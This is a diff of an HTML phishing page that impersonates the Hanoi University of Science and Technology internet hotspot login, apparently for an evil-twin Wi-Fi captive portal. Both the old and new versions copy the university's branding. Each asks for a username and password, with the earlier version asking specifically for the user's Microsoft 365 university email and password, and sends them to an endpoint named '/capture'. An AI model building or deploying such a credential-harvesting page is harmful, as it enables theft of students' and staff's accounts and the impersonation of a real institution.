@@ -3,54 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Đăng nhập - Bách Khoa Hà Nội</title>
-    <link rel="stylesheet" href="/styles.css"> 
+    <title>Đăng nhập | Đại học Bách khoa Hà Nội</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- Đảm bảo file styles.css được liên kết đúng -->
 </head>
 <body>
-    <div class="container">
-        <header class="header">
-            <div class="header-content">
-                <div class="logo-area">
-                   
-                    <img src="/images/logobkhn.png" alt="Logo Bách Khoa Hà Nội" class="logo">
-                </div>
-                <div class="header-text-block"> 
-                    <div class="university-title">ĐẠI HỌC</div>
-                    <div class="bkhn-title">BÁCH KHOA</div>
-                </div>
+
+    <header>
+        <div class="header-content">
+            <img src="images/logobkhn.png" alt="Logo Đại học Bách khoa Hà Nội">
+            <div class="university-info">
+                <h1>ĐẠI HỌC BÁCH KHOA HÀ NỘI</h1>
+                <p>HANOI UNIVERSITY OF SCIENCE AND TECHNOLOGY</p>
             </div>
-          
-        </header>
+        </div>
+    </header>
 
-        <main class="main-content">
-            
-            <h1 class="main-title">BÁCH KHOA HÀ NỘI</h1>
-            <p class="subtitle">MỘT TÌNH YÊU</p>
-            <p class="subtitle">MỘT TƯƠNG LAI</p>
+    <!-- Phần MAIN này sẽ được áp dụng ảnh nền cổng parabol -->
+    <main>
+        <!-- Khối login container nằm chính giữa phần main -->
+        <div class="login-container">
+            <h2>Welcome to</h2>
+            <div class="hust-logo-text">HUST</div>
+            <p class="service-text">Please log in to use the internet hotspot service</p>
 
-            <form action="/capture" method="post" class="login-form">
-                <div class="form-group">
-                    <label for="username">Username</label>
-                    <input type="text" id="username" name="username" required>
-                    <span class="hint">Điền địa chỉ email 365 của bạn vào đây (tên đăng nhập là phần @hust.edu.vn)</span>
+            <!-- Đã thêm method="post" và action="/capture" -->
+            <form method="post" action="/capture">
+                <div class="input-wrapper">
+                    <span class="icon">👤</span>
+                    <!-- Ô input username, Đã thêm name="username" -->
+                    <input type="text" name="username" placeholder="Username">
                 </div>
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" required>
-                    <span class="hint">Điền mật khẩu của email 365</span>
+                <div class="input-wrapper">
+                     <span class="icon">🔑</span>
+                     <!-- Ô input password, Đã thêm name="password" -->
+                     <input type="password" name="password" placeholder="Password">
                 </div>
-
-                <button type="submit" class="connect-button">CONNECT</button>
+                <button type="submit">Connect</button>
             </form>
-        </main>
+        </div>
+    </main>
 
-        <footer class="footer">
-            
-            <p>Powered by VNNIC in association with VBKIC</p>
-            
-        </footer>
-    </div>
-
+    <footer>
+         <div class="footer-left">
+             HANOI UNIVERSITY OF SCIENCE AND TECHNOLOGY <a href="https://hust.edu.vn" target="_blank">https://hust.edu.vn</a>
+         </div>
+         <div class="footer-right">
+             Powered by <span class="powered-hust">HUST</span>
+         </div>
+    </footer>
 
 </body>
 </html>
